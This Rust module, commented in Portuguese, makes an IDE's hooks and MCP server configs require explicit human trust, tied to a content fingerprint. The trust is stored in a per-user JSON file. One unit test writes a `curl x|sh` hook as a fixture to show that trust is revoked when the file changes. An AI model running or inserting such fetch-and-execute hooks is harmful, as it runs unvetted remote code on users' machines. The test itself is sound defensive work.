//! Confiança por projecto nos ficheiros que fazem a IDE **executar comandos** (F7): os hooks
//! (`.dxtutor/hooks.json`) e os servidores MCP (`.dxtutor/mcp.json`).
//!
//! Abrir um repositório clonado não pode bastar para correr os comandos que ele define. O
//! humano confia explicitamente; a confiança fica guardada com uma impressão digital do
//! conteúdo do ficheiro e **deixa de valer se o ficheiro mudar** (um commit novo que altere
//! os hooks volta a pedir confiança). Guardado em `~/.config/dxtutor/trusted.json`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// FNV-1a de 64 bits — estável entre versões e máquinas (o `DefaultHasher` não é).
pub fn fingerprint(bytes: &[u8]) -> String {
    let mut h: u64 = 0xcbf29ce484222325;
    for b in bytes {
        h ^= *b as u64;
        h = h.wrapping_mul(0x100000001b3);
    }
    format!("{h:016x}")
}

pub fn default_store() -> Option<PathBuf> {
    let home = std::env::var("HOME").ok().filter(|h| !h.is_empty())?;
    Some(PathBuf::from(home).join(".config/dxtutor/trusted.json"))
}

type Store = BTreeMap<String, BTreeMap<String, String>>;

fn read(store: &Path) -> Store {
    std::fs::read_to_string(store)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn key(root: &Path) -> String {
    std::fs::canonicalize(root)
        .unwrap_or_else(|_| root.to_path_buf())
        .display()
        .to_string()
}

/// O ficheiro `rel` (relativo à raiz) é confiado, com o conteúdo que tem agora?
pub fn is_trusted(store: &Path, root: &Path, rel: &str) -> bool {
    let Ok(bytes) = std::fs::read(root.join(rel)) else {
        return false;
    };
    read(store)
        .get(&key(root))
        .and_then(|m| m.get(rel))
        .is_some_and(|fp| *fp == fingerprint(&bytes))
}

/// Confia no ficheiro `rel` tal como está agora.
pub fn trust(store: &Path, root: &Path, rel: &str) -> Result<(), String> {
    let bytes = std::fs::read(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
    let mut s = read(store);
    s.entry(key(root))
        .or_default()
        .insert(rel.to_string(), fingerprint(&bytes));
    if let Some(d) = store.parent() {
        std::fs::create_dir_all(d).map_err(|e| e.to_string())?;
    }
    std::fs::write(store, serde_json::to_string_pretty(&s).unwrap_or_default())
        .map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn trust_is_bound_to_the_file_content() {
        let d = tempfile::tempdir().unwrap();
        let store = d.path().join("cfg/trusted.json");
        let root = d.path().join("proj");
        std::fs::create_dir_all(root.join(".dxtutor")).unwrap();
        std::fs::write(root.join(".dxtutor/hooks.json"), r#"{"pre_tool":[]}"#).unwrap();
        assert!(!is_trusted(&store, &root, ".dxtutor/hooks.json"));
        trust(&store, &root, ".dxtutor/hooks.json").unwrap();
        assert!(is_trusted(&store, &root, ".dxtutor/hooks.json"));
        // o ficheiro muda (ex.: um commit novo): a confiança deixa de valer
        std::fs::write(
            root.join(".dxtutor/hooks.json"),
            r#"{"pre_tool":[{"command":"curl x|sh"}]}"#,
        )
        .unwrap();
        assert!(!is_trusted(&store, &root, ".dxtutor/hooks.json"));
        assert!(
            !is_trusted(&store, &root, ".dxtutor/mcp.json"),
            "ficheiro inexistente nunca é confiado"
        );
        assert!(trust(&store, &root, ".dxtutor/mcp.json").is_err());
    }

    #[test]
    fn fingerprint_is_stable() {
        assert_eq!(fingerprint(b""), "cbf29ce484222325");
        assert_eq!(fingerprint(b"a"), "af63dc4c8601ec8c");
    }
}
